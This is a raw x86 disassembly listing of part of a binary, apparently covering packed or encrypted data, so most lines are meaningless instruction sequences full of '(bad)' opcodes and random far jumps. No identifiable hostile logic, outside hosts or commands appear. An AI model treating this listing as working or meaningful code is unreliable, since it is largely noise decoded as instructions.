  40d32f:	mov    WORD PTR [ecx],ss
  40d331:	ret    0xa34f
  40d334:	mov    al,ds:0xd1583f70
  40d339:	pop    ss
  40d33a:	gs jae 0x40d3a8
  40d33d:	lods   al,BYTE PTR fs:[esi]
  40d33f:	fcomp  st(5)
  40d341:	mov    gs:0xa931c909,eax
  40d347:	sbb    eax,0x66c1c786
  40d34c:	dec    edx
  40d34d:	mov    BYTE PTR [edx],cl
  40d34f:	add    ebx,DWORD PTR [ebp-0x6f]
  40d352:	cmc    
  40d353:	push   esi
  40d354:	imul   edi,ebx,0x5d593417
  40d35a:	xor    al,0xe4
  40d35c:	jmp    0x9aa3:0x7ce3968
  40d363:	jo     0x40d34b
  40d365:	jno    0x40d2f9
  40d367:	pushw  ds
  40d369:	sbb    ebp,edi
  40d36b:	jle    0x40d319
  40d36d:	adc    eax,0xf6e3055
  40d372:	mov    esi,DWORD PTR [edi+esi*1+0x2]
  40d376:	iret   
  40d377:	lds    edx,FWORD PTR [edx-0x45dfbb35]
  40d37d:	aad    0x74
  40d37f:	jle    0x40d39c
  40d381:	pop    edx
  40d382:	push   eax
  40d383:	adc    BYTE PTR [edx],0xeb
  40d386:	inc    ecx
  40d387:	(bad)  
  40d388:	imul   ebp,DWORD PTR [esi*2-0x4b07df8f],0x90378b1b
  40d393:	je     0x40d341
  40d395:	xlat   BYTE PTR ds:[ebx]
  40d396:	cs push ebx
  40d398:	int3   
  40d399:	adc    edx,DWORD PTR [ecx+esi*1]
  40d39c:	pop    edx
  40d39d:	sbb    al,0x3e
  40d39f:	xor    ebp,DWORD PTR [esi+0x49]
  40d3a2:	dec    esp
  40d3a3:	mov    bl,0x14
  40d3a5:	std    
  40d3a6:	imul   ebp,DWORD PTR [edi],0xb901493d
  40d3ac:	add    DWORD PTR [ebp+0x6f197da4],0xf80a793
  40d3b6:	out    dx,al
  40d3b7:	fdivr  QWORD PTR [ecx+0x958488]
  40d3bd:	push   edi
  40d3be:	push   ecx
  40d3bf:	inc    edx
  40d3c0:	(bad)  [esi-0x13b574ea]
  40d3c6:	clc    
  40d3c7:	nop
  40d3c8:	pushf  
  40d3c9:	aas    
  40d3ca:	lds    ecx,FWORD PTR [ebx+edi*2+0x1663a306]
  40d3d1:	jbe    0x40d385
  40d3d3:	add    BYTE PTR [esi+edi*4],ah
  40d3d6:	loope  0x40d422
  40d3d8:	ss push esp
  40d3da:	mov    ebp,0x7243ee1b
  40d3df:	inc    eax
  40d3e0:	(bad)  
  40d3e1:	fnstsw WORD PTR [edi]
  40d3e3:	inc    ebx
  40d3e4:	jne    0x40d3cd
  40d3e6:	mov    ebx,0x5293e82f
  40d3eb:	jne    0x40d412
  40d3ed:	je     0x40d44b
  40d3ef:	ins    BYTE PTR es:[edi],dx
  40d3f0:	(bad)  
  40d3f1:	std    
  40d3f2:	fbld   TBYTE PTR [ebx+0x41abe15c]
  40d3f8:	loop   0x40d43a
  40d3fa:	imul   edx,DWORD PTR [ecx-0xf946ca3],0x30
  40d401:	jle    0x40d425
  40d403:	xor    DWORD PTR [ecx],esp
  40d405:	pop    ds
  40d406:	adc    al,0xa7
  40d408:	fwait
  40d409:	push   ebx
  40d40a:	jge    0x40d406
  40d40c:	bound  eax,QWORD PTR [edi-0x9409afc]
  40d412:	dec    ebx
  40d413:	retf   
  40d414:	adc    esp,DWORD PTR [ebp-0x58]
  40d417:	cdq    
  40d418:	xchg   esp,eax
  40d419:	add    dh,BYTE PTR [eax+0x434afe28]
  40d41f:	push   ds
  40d420:	js     0x40d496
  40d422:	sub    al,0x31
  40d424:	pop    eax
  40d425:	adc    al,0x48
  40d427:	and    BYTE PTR [edx+0x1a36d96],0xd5
  40d42e:	sbb    DWORD PTR [ebx],ebx
  40d430:	repz push 0xd16bb695
  40d436:	xor    eax,0xe8821df2
  40d43b:	cmp    DWORD PTR [ebx+0x577aae85],esp
  40d441:	sbb    bh,BYTE PTR [edi+0x214624f3]
  40d447:	(bad)  
  40d448:	outs   dx,DWORD PTR ds:[esi]
  40d449:	dec    edx
  40d44a:	push   0xffffffed
  40d44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44d:	add    BYTE PTR [eax+0x5b],dl
  40d450:	xchg   edi,eax
  40d451:	and    DWORD PTR [esp+eax*2+0x1e],edi
  40d455:	js     0x40d4bb
  40d457:	sahf   
  40d458:	daa    
  40d459:	mov    bl,0x78
  40d45b:	test   al,0xd9
  40d45d:	mov    ah,0x3e
  40d45f:	xor    esp,DWORD PTR [eax+ebx*4]
  40d462:	lods   al,BYTE PTR ds:[esi]
  40d463:	adc    ah,BYTE PTR [esi]
  40d465:	sbb    DWORD PTR [ecx],0xb070531f
  40d46b:	lods   al,BYTE PTR ds:[esi]
  40d46c:	out    0xde,al
  40d46e:	in     al,dx
  40d46f:	dec    esi
  40d470:	cli    
  40d471:	test   al,0x2c
  40d473:	jnp    0x40d4ab
  40d475:	dec    edx
  40d476:	fs js  0x40d482
  40d479:	dec    ebp
  40d47a:	fld    QWORD PTR [ebx+edx*2+0x61e3bc14]
  40d481:	push   ebx
  40d482:	mov    ebp,DWORD PTR [edx-0x7ef26111]
  40d488:	push   ebx
  40d489:	pop    ebp
  40d48a:	pusha  
  40d48b:	les    ebx,FWORD PTR [ebx+0x7223d4a1]
  40d491:	inc    eax
  40d492:	test   BYTE PTR [eax-0x6c3f7eca],0x20
  40d499:	aad    0x5
  40d49b:	jo     0x40d43b
  40d49d:	pop    ss
  40d49e:	pop    eax
  40d49f:	xchg   BYTE PTR [edx-0x73f6cdc8],cl
  40d4a5:	call   0xb2c90d8e
  40d4aa:	mov    cl,0x8
  40d4ac:	(bad)  
  40d4ad:	xor    edx,ecx
  40d4af:	or     eax,0x33ba3e1b
  40d4b4:	jle    0x40d50c
  40d4b6:	add    BYTE PTR [edi],dl
  40d4b8:	add    esi,DWORD PTR [edi-0xb]
  40d4bb:	sub    bh,al
  40d4bd:	or     eax,0xac05babe
  40d4c2:	xchg   dh,al
  40d4c4:	inc    ebp
  40d4c5:	leave  
  40d4c6:	pop    ss
  40d4c7:	add    ebx,ebp
  40d4c9:	imul   eax,DWORD PTR ds:[ebp-0x5e657d0f],0x8cd75486
  40d4d4:	pop    ds
  40d4d5:	icebp  
  40d4d6:	in     eax,0xe5
  40d4d8:	fs inc esi
  40d4da:	mov    bl,BYTE PTR [eax-0x46f802f5]
  40d4e0:	inc    esp
  40d4e1:	fimul  DWORD PTR [ebx+ecx*2]
  40d4e4:	lahf   
  40d4e5:	les    ebp,FWORD PTR [ebp-0x2b4ea40b]
  40d4eb:	sbb    eax,0x648ef823
  40d4f0:	rol    DWORD PTR [esi-0x750ec4f2],cl
  40d4f6:	inc    edx
  40d4f7:	sbb    DWORD PTR [edx+0x31],ecx
  40d4fa:	daa    
  40d4fb:	push   ebp
  40d4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4fd:	js     0x40d481
  40d4ff:	outs   dx,BYTE PTR ds:[esi]
  40d500:	out    dx,al
  40d501:	or     bh,ah
  40d503:	jnp    0x40d4ab
  40d505:	ins    DWORD PTR es:[edi],dx
  40d506:	xchg   DWORD PTR [ecx+0x1],edi
  40d509:	into   
  40d50a:	jmp    0x335e1612
  40d50f:	xchg   ebp,eax
  40d510:	and    al,0xda
  40d512:	sbb    DWORD PTR [ebx+eax*4+0x416b72b2],edx
  40d519:	jo     0x40d4b9
  40d51b:	out    0xbb,eax
  40d51d:	in     eax,0xa0
  40d51f:	fdiv   QWORD PTR [edx+0x70b573bc]
  40d525:	push   edi
  40d526:	repnz ds or ebx,esp
  40d52a:	add    al,0xc5
  40d52c:	psllq  mm6,QWORD PTR [esi-0x3f]
  40d530:	xchg   edi,eax
  40d531:	push   esp
  40d532:	sub    ebx,edi
  40d534:	mov    WORD PTR [edi],?
  40d536:	inc    edi
  40d537:	jnp    0x40d527
  40d539:	ret    0xeadd
  40d53c:	fisttp QWORD PTR [edi]
  40d53e:	jb     0x40d4d6
  40d540:	daa    
  40d541:	ret    
  40d542:	jns    0x40d554
  40d544:	bound  edi,QWORD PTR [eax]
  40d546:	repnz enter 0x65c5,0xad
  40d54b:	shl    BYTE PTR [ebp-0xce5558c],0xcb
  40d552:	ret    0xeb02
  40d555:	sub    bh,dh
  40d557:	mov    ds:0xb5346102,eax
  40d55c:	add    dl,BYTE PTR ds:0x5648b14e
  40d563:	add    esi,esi
  40d565:	mov    esp,0x8c5119b4
  40d56a:	xor    BYTE PTR [ecx+0x8],bh
  40d56d:	pop    edi
  40d56e:	sbb    eax,0xda4fd4c0
  40d573:	xchg   ecx,eax
  40d574:	dec    ecx
  40d575:	outs   dx,BYTE PTR ds:[esi]
  40d576:	mov    cl,0x66
  40d578:	icebp  
  40d579:	aas    
  40d57a:	rol    BYTE PTR [edx+0x15],0x8d
  40d57e:	adc    ecx,DWORD PTR [ebp+0x11]
  40d581:	(bad)  
  40d582:	xchg   edx,eax
  40d583:	pop    eax
  40d584:	lock ja 0x40d53a
  40d587:	push   cs
  40d588:	fsub   QWORD PTR [edx+0x33]
  40d58b:	push   esp
  40d58c:	call   0x9e43b4b1
  40d591:	sahf   
  40d592:	adc    cl,dl
  40d594:	pop    ss
  40d595:	sbb    DWORD PTR [ebp+0x5ae42e18],ebx
  40d59b:	test   DWORD PTR [edx-0x2467251a],0x438cdf2e
  40d5a5:	mov    ecx,DWORD PTR [ebp-0x20]
  40d5a8:	xor    edx,edx
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	mov    edx,DWORD PTR [esi-0x23184357]
  40d5c1:	sbb    BYTE PTR [eax],bl
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    BYTE PTR [eax-0x111eb11e],bh
  40d5cc:	xchg   esp,eax
  40d5cd:	xor    BYTE PTR cs:[ecx+0x166c36cc],0xaa
  40d5d5:	in     al,0x6e
  40d5d7:	jnp    0x40d601
  40d5d9:	mov    ds:0xa2003983,al
  40d5de:	nop
  40d5df:	fsub   DWORD PTR [ecx+0x21f691ed]
  40d5e5:	mov    ebx,0x5d42a601
  40d5ea:	cmp    al,0xac
  40d5ec:	pop    ds
  40d5ed:	xor    al,BYTE PTR [eax]
  40d5ef:	cmp    BYTE PTR [edi+0x5f],cl
  40d5f2:	mov    dh,0x9b
  40d5f4:	jns    0x40d5d0
  40d5f6:	ins    DWORD PTR es:[edi],dx
  40d5f7:	adc    ecx,ebx
  40d5f9:	adc    ebx,ecx
  40d5fb:	(bad)  
  40d5fc:	cli    
  40d5fd:	enter  0x88d,0x4e
  40d601:	sub    al,0x59
  40d603:	es fwait
  40d605:	xor    ecx,ebp
  40d607:	outs   dx,BYTE PTR ds:[esi]
  40d608:	and    dh,BYTE PTR [eax+eiz*8+0x4fb4d348]
  40d60f:	cli    
  40d610:	arpl   si,bx
  40d612:	push   esi
  40d613:	jge    0x40d5c1
  40d615:	sar    dl,cl
  40d617:	imul   edx,ebp,0xffffffee
  40d61a:	push   eax
  40d61b:	dec    ebp
  40d61c:	and    eax,0x82e90aa6
  40d621:	sub    BYTE PTR [edx],ch
  40d623:	or     edi,DWORD PTR ds:0xf9eeffff
  40d629:	ds dec edx
  40d62b:	fbstp  TBYTE PTR [edi-0x38]
  40d62e:	addr16 mov ebx,0xf7476a40
  40d634:	addr16 push eax
  40d636:	ret    
  40d637:	xchg   bl,cl
  40d639:	or     al,ah
  40d63b:	pusha  
  40d63c:	add    al,0x9c
  40d63e:	xchg   ebx,eax
  40d63f:	add    edx,DWORD PTR [ebx-0x3448b4c8]
  40d645:	xchg   ebp,eax
  40d646:	pop    ds
  40d647:	in     eax,dx
  40d648:	sbb    al,0xfe
  40d64a:	cdq    
  40d64b:	adc    bh,ah
  40d64d:	xchg   esi,eax
  40d64e:	lds    esp,FWORD PTR [edx-0x26]
  40d651:	add    eax,0x753d2f8c
  40d656:	rcl    edi,1
  40d658:	jo     0x40d65a
  40d65a:	jge    0x40d664
  40d65c:	push   ecx
  40d65d:	inc    esp
  40d65e:	clc    
  40d65f:	or     edi,edi
  40d661:	push   ebp
  40d662:	out    dx,eax
  40d663:	gs mov edx,0x1493a181
  40d669:	jge    0x40d60c
  40d66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d66c:	push   0x7271f078
  40d671:	dec    ebx
  40d672:	pop    ss
  40d673:	dec    edi
  40d674:	lea    ebx,[eax+0x39]
  40d677:	int    0x53
  40d679:	cld    
  40d67a:	sbb    bh,BYTE PTR [ecx-0xe]
  40d67d:	sbb    BYTE PTR ds:0x3495711d,bh
  40d683:	mov    ch,0x46
  40d685:	inc    eax
  40d686:	add    al,0xf3
  40d688:	aas    
  40d689:	push   0xffffffdc
  40d68b:	inc    esi
  40d68c:	out    dx,al
  40d68d:	dec    edx
  40d68e:	leave  
  40d68f:	lds    esp,FWORD PTR [ecx-0x46]
  40d692:	xchg   esi,eax
  40d693:	imul   ebp,DWORD PTR [edi],0x1b
  40d696:	enter  0xb69e,0xcc
  40d69a:	inc    ebp
  40d69b:	adc    BYTE PTR [esi-0x1f],bh
  40d69e:	jmp    0x4e98:0x54652ff3
  40d6a5:	rcl    DWORD PTR [ebx-0x6e3d545],cl
  40d6ab:	mov    dl,0x1f
  40d6ad:	stos   DWORD PTR es:[edi],eax
  40d6ae:	or     BYTE PTR [ecx],bh
  40d6b0:	mov    eax,0xc3df889e
  40d6b5:	lods   eax,DWORD PTR ds:[esi]
  40d6b6:	inc    esp
  40d6b7:	clc    
  40d6b8:	int3   
  40d6b9:	xlat   BYTE PTR ds:[ebx]
  40d6ba:	jae    0x40d6d4
  40d6bc:	adc    BYTE PTR [esi+0x51fb63d2],dh
  40d6c2:	cwde   
  40d6c3:	fs mov cl,0xc2
  40d6c6:	(bad)  
  40d6c7:	in     al,0x75
  40d6c9:	int3   
  40d6ca:	(bad)  
  40d6cc:	shr    dl,0x26
  40d6cf:	xchg   esi,eax
  40d6d0:	gs xchg esp,eax
  40d6d2:	xor    al,0xd5
  40d6d4:	sbb    DWORD PTR [esi+eax*4-0x7a1772fb],edx
  40d6db:	mov    ?,eax
  40d6dd:	loopne 0x40d6c7
  40d6df:	push   ecx
  40d6e0:	cmp    ah,BYTE PTR [ebp-0x7]
  40d6e3:	loopne 0x40d6a4
  40d6e5:	jmp    0x63ea:0x5e4553d
  40d6ec:	adc    BYTE PTR [ebp-0x54],ah
  40d6ef:	imul   ebx,DWORD PTR [edx+0x73790101],0xffffffb4
  40d6f6:	xchg   edi,eax
  40d6f7:	shr    DWORD PTR [eax+0x42],cl
  40d6fa:	popf   
  40d6fb:	mov    bl,0x97
  40d6fd:	dec    eax
  40d6fe:	and    DWORD PTR ds:0x12ce0a3c,esp
  40d704:	xor    BYTE PTR ds:0x7c0e8fba,ah
  40d70a:	sub    BYTE PTR [ebx],bl
  40d70c:	adc    eax,0x97fc0cd0
  40d711:	mov    edx,0x750b7c27
  40d716:	pushf  
  40d717:	fdivr  st,st(4)
  40d719:	push   ebx
  40d71a:	or     al,0xf1
  40d71c:	sbb    esp,DWORD PTR [ecx+ebx*8-0x5d]
  40d720:	imul   esi,DWORD PTR [eax-0x19],0x32
  40d724:	arpl   si,di
  40d726:	sub    eax,DWORD PTR [ebp-0x3e450589]
  40d72c:	stc    
  40d72d:	imul   edi,DWORD PTR [esi+0x52a70438],0x4f50d250
  40d737:	jmp    0x42c12730
  40d73c:	sub    eax,0x4e838cb0
  40d741:	sub    DWORD PTR [ecx+0x28],edi
  40d744:	cmp    eax,0xc24f7292
  40d749:	ins    BYTE PTR es:[edi],dx
  40d74a:	jo     0x40d79d
  40d74c:	test   DWORD PTR [edi+0xcd3a2a6],ebx
  40d752:	mov    BYTE PTR [ecx+0x1],bl
  40d755:	or     ebp,DWORD PTR [ebx+edi*8]
  40d758:	and    edx,edi
  40d75a:	shr    dl,cl
  40d75c:	jmp    0x40d780
  40d75e:	pop    ecx
  40d75f:	add    esi,ebp
  40d761:	pop    eax
  40d762:	cld    
  40d763:	push   edi
  40d764:	add    dl,dl
  40d766:	sti    
  40d767:	add    al,0x7d
  40d769:	mov    BYTE PTR [edx-0x7f],cl
  40d76c:	mov    esp,0x38f4eaad
  40d771:	test   al,0xc3
  40d773:	push   DWORD PTR [edi+0x2d]
  40d776:	push   esp
  40d777:	aas    
  40d778:	push   cs
  40d779:	stos   DWORD PTR es:[edi],eax
  40d77a:	mov    bl,0xaf
  40d77c:	jmp    0xe339:0xf4c1543d
  40d783:	ss lahf 
  40d785:	out    0x12,eax
  40d787:	or     DWORD PTR [edx+0x31de1c4],ecx
  40d78d:	(bad)  
  40d78e:	fsubp  st(6),st
  40d790:	ja     0x40d7d6
  40d792:	jge    0x40d714
  40d794:	ffree  st(7)
  40d796:	xor    dl,BYTE PTR [esi+0x5f]
  40d799:	stc    
  40d79a:	push   ebp
  40d79b:	ins    BYTE PTR es:[edi],dx
  40d79c:	loope  0x40d781
  40d79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79f:	cmp    DWORD PTR [esi+0x5d5cb4ae],eax
  40d7a5:	test   eax,ebp
  40d7a7:	mov    DWORD PTR [ecx+0x74],eax
  40d7aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ab:	loopne 0x40d789
  40d7ad:	dec    edi
  40d7ae:	sbb    DWORD PTR [edi],edi
  40d7b0:	jecxz  0x40d82e
  40d7b2:	fistp  WORD PTR [edi]
  40d7b4:	in     al,dx
  40d7b5:	pop    esp
  40d7b6:	dec    ebp
  40d7b7:	(bad)  
  40d7b8:	sub    al,0x72
  40d7ba:	inc    esp
  40d7bb:	xchg   DWORD PTR [ebx+0x79cdd5f5],ebx
  40d7c1:	xchg   ebp,eax
  40d7c2:	mov    esi,0x5094a779
  40d7c7:	ins    DWORD PTR es:[edi],dx
  40d7c8:	or     BYTE PTR [ebx-0x6b80ebfe],ch
  40d7ce:	fs dec ebx
  40d7d0:	fxch   st(0)
  40d7d2:	pop    ebx
  40d7d3:	sbb    bl,al
  40d7d5:	scas   al,BYTE PTR es:[edi]
  40d7d6:	fimul  DWORD PTR [edi+0x28]
  40d7d9:	cmp    al,0xd2
  40d7db:	sti    
  40d7dc:	js     0x40d7c1
  40d7de:	and    bl,cl
  40d7e0:	scas   al,BYTE PTR es:[edi]
  40d7e1:	loop   0x40d7c7
  40d7e3:	inc    ecx
  40d7e4:	push   0x6b
  40d7e6:	sar    DWORD PTR [esi+0x7584e190],0x5c
  40d7ed:	inc    esp
  40d7ee:	ror    DWORD PTR [ecx-0x68],1
  40d7f1:	test   BYTE PTR ds:0xdba11ea6,cl
  40d7f7:	adc    DWORD PTR [ebp+0x5345ea43],0x71bfd9c7
  40d801:	push   es
  40d802:	xor    ebp,DWORD PTR [eax-0x2fa7b4a0]
  40d808:	jmp    0x9e79:0x4de54f5c
  40d80f:	scas   al,BYTE PTR es:[edi]
  40d810:	retf   
  40d811:	or     al,0x15
  40d813:	dec    edx
  40d814:	and    ecx,ebp
  40d816:	nop    ecx
  40d819:	pop    ebp
  40d81a:	fucom  st(4)
  40d81c:	outs   dx,BYTE PTR ds:[esi]
  40d81d:	push   es
  40d81e:	mov    ds:0x65f05f03,al
  40d823:	clc    
  40d824:	daa    
  40d825:	clc    
  40d826:	push   0xffffff9e
  40d828:	pop    ss
  40d829:	mov    esi,0x5ec8014e
  40d82e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d82f:	dec    ecx
  40d830:	(bad)  
  40d831:	mov    ch,0x67
  40d833:	cmp    ah,dl
  40d835:	and    eax,0x36150466
  40d83a:	or     BYTE PTR [edi-0x47],cl
  40d83d:	ret    
  40d83e:	out    0xe2,eax
  40d840:	xchg   edx,eax
  40d841:	mov    cl,0x41
  40d843:	addr16 dec eax
  40d845:	sbb    ecx,esi
  40d847:	mov    ch,0x2d
  40d849:	fbld   TBYTE PTR [edi]
  40d84b:	mov    al,0x78
  40d84d:	sbb    bh,bh
  40d84f:	icebp  
  40d850:	int    0x37
  40d852:	ret    0x314b
  40d855:	outs   dx,DWORD PTR ds:[esi]
  40d856:	icebp  
  40d857:	dec    ebp
  40d858:	and    BYTE PTR ds:0xbca921d2,cl
  40d85e:	popa   
  40d85f:	and    BYTE PTR [edi+ecx*4],cl
  40d862:	into   
  40d863:	and    bl,BYTE PTR [esi+0x4dde3263]
  40d869:	sub    BYTE PTR [edi],0xea
  40d86c:	inc    ecx
  40d86d:	out    0xbf,al
  40d86f:	mov    ch,0x4d
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xd94f0fbc
  40d894:	mov    esp,0x1818d8a0
  40d899:	rcl    BYTE PTR [eax+ebx*1],cl
  40d89c:	sbb    BYTE PTR [eax+0x27e10b08],ch
  40d8a2:	inc    esp
  40d8a3:	inc    esp
  40d8a4:	leave  
  40d8a5:	inc    ebp
  40d8a6:	lea    eax,[ebx]
  40d8a8:	cmp    DWORD PTR [eax],esi
  40d8aa:	add    DWORD PTR [edi-0x14],ecx
  40d8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ae:	sbb    dh,cl
  40d8b0:	mov    esp,0xb1aaa286
  40d8b5:	lahf   
  40d8b6:	ds enter 0xea60,0x34
  40d8bb:	xor    bh,BYTE PTR [esi]
  40d8bd:	icebp  
  40d8be:	repz mov cs,WORD PTR [ebp+0x525b4493]
  40d8c5:	aaa    
  40d8c6:	push   edx
  40d8c7:	es sub eax,0x4ad0a2ce
  40d8cd:	push   ebx
  40d8ce:	sub    ecx,DWORD PTR [edx+0x23]
  40d8d1:	push   ecx
  40d8d2:	nop
  40d8d3:	retf   
  40d8d4:	sar    eax,cl
  40d8d6:	sbb    DWORD PTR [edi],0x5f
  40d8d9:	scas   eax,DWORD PTR es:[edi]
  40d8da:	test   eax,0x82504f90
  40d8df:	xor    edx,DWORD PTR [edx]
  40d8e1:	mov    al,ds:0xe5b0082c
  40d8e6:	xchg   edx,eax
  40d8e7:	jb     0x40d882
  40d8e9:	mov    dl,0xbb
  40d8eb:	adc    BYTE PTR [ecx],bl
  40d8ed:	xchg   edi,eax
  40d8ee:	pusha  
  40d8ef:	retf   
  40d8f0:	inc    esi
  40d8f1:	pop    es
  40d8f2:	mov    al,0x4b
  40d8f4:	push   0xbe7ba84
  40d8f9:	cmp    dl,BYTE PTR [ebx-0xd]
  40d8fc:	jg     0x40d942
  40d8fe:	inc    ebx
  40d8ff:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40d901:	int    0x6b
  40d903:	mov    edi,DWORD PTR es:[edx+0x34b0be2a]
  40d90a:	scas   eax,DWORD PTR es:[edi]
  40d90b:	and    eax,0xc38c335
  40d910:	mov    dh,0xc3
  40d912:	ins    DWORD PTR es:[edi],dx
  40d913:	retf   0x5392
  40d916:	push   es
  40d917:	jb     0x40d93c
  40d919:	or     eax,DWORD PTR [ecx+eiz*8-0x3f62c51a]
  40d920:	adc    eax,0x1fe9cce1
  40d925:	int3   
  40d926:	and    bl,BYTE PTR [edx]
  40d928:	pop    eax
  40d929:	clc    
  40d92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d92b:	push   ebp
  40d92c:	into   
  40d92d:	xchg   esp,eax
  40d92e:	mov    BYTE PTR ds:0x50272ee6,bl
  40d934:	fwait
  40d935:	sti    
  40d936:	jnp    0x40d938
  40d938:	dec    ecx
  40d939:	xchg   ebp,eax
  40d93a:	fs mov esp,0x8a83869c
  40d940:	int    0xe9
  40d942:	push   ds
  40d943:	cdq    
  40d944:	pop    ds
  40d945:	adc    al,0x33
  40d947:	loopne 0x40d998
  40d949:	ficomp WORD PTR [ebp-0x797c451e]
  40d94f:	jecxz  0x40d92c
  40d951:	cmp    BYTE PTR [edx],al
  40d953:	scas   al,BYTE PTR es:[edi]
  40d954:	popa   
  40d955:	or     eax,0x216bb02f
  40d95a:	and    DWORD PTR [ebx+0x8],esp
  40d95d:	sub    DWORD PTR [eax],ebx
  40d95f:	or     al,0x69
  40d961:	ja     0x40d952
  40d963:	out    dx,eax
  40d964:	or     eax,0xbb4c7015
  40d969:	cmp    dh,BYTE PTR [eax-0x5cd9424f]
  40d96f:	inc    ebx
  40d970:	mov    ds:0x674397f9,eax
  40d975:	jecxz  0x40d9e4
  40d977:	bnd jmp 0xf7ff823
  40d97d:	mov    al,0x26
  40d97f:	popf   
  40d980:	inc    edi
  40d981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d982:	outs   dx,DWORD PTR ds:[esi]
  40d983:	dec    ecx
  40d984:	mov    ebx,0x53ea7216
  40d989:	ret    
  40d98a:	push   edi
  40d98b:	rcl    DWORD PTR [edi-0x3b],0xf7
  40d98f:	sub    ebp,ebx
  40d991:	xor    eax,0xcb4c0305
  40d996:	mov    bl,0xfd
  40d998:	jge    0x40d9e2
  40d99a:	mov    ecx,0x99db6f8b
  40d99f:	inc    esi
  40d9a0:	iret   
  40d9a1:	jecxz  0x40d987
  40d9a3:	cli    
  40d9a4:	mov    ?,WORD PTR [ebx-0x6c7ab2ec]
  40d9aa:	adc    ah,BYTE PTR [ebx-0x620ce494]
  40d9b0:	push   ebx
  40d9b1:	fisub  DWORD PTR [edx]
  40d9b3:	aad    0x87
  40d9b5:	xor    ecx,DWORD PTR [edx]
  40d9b7:	mov    eax,0xf0e043f1
  40d9bc:	or     ah,dh
  40d9be:	imul   esi,DWORD PTR [ecx+0x775359ca],0x4c6ad37a
  40d9c8:	add    DWORD PTR [esi-0x3d],esi
  40d9cb:	repz and eax,0xc934249c
  40d9d1:	leave  
  40d9d2:	jae    0x40d9b3
  40d9d4:	or     ecx,DWORD PTR [ebp-0x65ace9c]
  40d9da:	loopne 0x40d98b
  40d9dc:	mov    ds:0x6ae7d8e7,al
  40d9e1:	push   esp
  40d9e2:	ja     0x40da20
  40d9e4:	sub    DWORD PTR [ecx],0x3a767186
  40d9ea:	dec    esi
  40d9eb:	icebp  
  40d9ec:	dec    ebp
  40d9ed:	xchg   edi,eax
  40d9ee:	sti    
  40d9ef:	sub    dl,bl
  40d9f1:	cmp    BYTE PTR [esi+0x70e2c06d],ah
  40d9f7:	and    DWORD PTR [ecx],ebp
  40d9f9:	mov    eax,DWORD PTR [edi]
  40d9fb:	loop   0x40da7a
  40d9fd:	loopne 0x40d986
  40d9ff:	jmp    0x40da2f
  40da01:	push   ebx
  40da02:	popf   
  40da03:	das    
  40da04:	add    eax,0x902c3d2f
  40da09:	fisubr WORD PTR [eax]
  40da0b:	dec    esp
  40da0c:	arpl   WORD PTR [ecx],cx
  40da0e:	test   al,0x2c
  40da10:	lea    ebp,[esp+eax*2+0x7984cf77]
  40da17:	and    al,0x5f
  40da19:	push   cs
  40da1a:	jae    0x40da6e
  40da1c:	imul   BYTE PTR [ebp+0x4afce1e5]
  40da22:	mov    bh,0x94
  40da24:	pushf  
  40da25:	sbb    BYTE PTR ds:0x399dffb6,dl
  40da2b:	scas   al,BYTE PTR es:[edi]
  40da2c:	add    eax,0xec4b722
  40da31:	mov    ds:0x277a4162,al
  40da36:	jno    0x40da7b
  40da38:	xor    DWORD PTR [ecx-0x462b6f7f],edi
  40da3e:	xchg   DWORD PTR [ebp-0x29891b2e],ebx
  40da44:	fwait
  40da45:	inc    esi
  40da46:	dec    esi
  40da47:	mov    al,0x41
  40da49:	out    dx,eax
  40da4a:	(bad)  
  40da4b:	in     al,0xf6
  40da4d:	stos   BYTE PTR es:[edi],al
  40da4e:	enter  0x40be,0xeb
  40da52:	xchg   esp,eax
  40da53:	add    al,0x75
  40da55:	or     ch,BYTE PTR [edx+0x2a0ac4f8]
  40da5b:	or     al,BYTE PTR [eax+0x7ba38d8a]
  40da61:	dec    edx
  40da62:	(bad)  
  40da63:	in     al,dx
  40da64:	sahf   
  40da65:	dec    ebp
  40da66:	jns    0x40dab1
  40da68:	fwait
  40da69:	xchg   ecx,eax
  40da6a:	shl    BYTE PTR [eax],1
  40da6c:	mov    ch,0xeb
  40da6e:	jae    0x40dab3
  40da70:	lock push ds
  40da72:	sbb    esi,DWORD PTR [esi-0x578c106b]
  40da78:	mov    bl,0xd0
  40da7a:	imul   ebp,DWORD PTR [edi-0x38f3174e],0xffffff96
  40da81:	imul   eax,DWORD PTR [esi*1+0x5ac9ad47],0x25
  40da89:	mov    eax,0xc8adf3fa
  40da8e:	inc    ebx
  40da8f:	das    
  40da90:	add    DWORD PTR [edx-0x64],ecx
  40da93:	mov    esi,0x5ee68acb
  40da98:	dec    edi
  40da99:	mov    bh,0x7
  40da9b:	xor    bl,BYTE PTR [eax+eax*4+0xd41fefe]
  40daa2:	pop    ebp
  40daa3:	xchg   ebp,eax
  40daa4:	push   edi
  40daa5:	jle    0x40dab2
  40daa7:	adc    BYTE PTR [ecx-0x180fc465],ah
  40daad:	addr16 jle 0x40da71
  40dab0:	js     0x40da57
  40dab2:	pop    ds
  40dab3:	add    BYTE PTR [ecx],0xa0
  40dab6:	adc    al,0x85
  40dab8:	adc    al,0x4b
  40daba:	lea    esi,[ecx-0x73e27a6b]
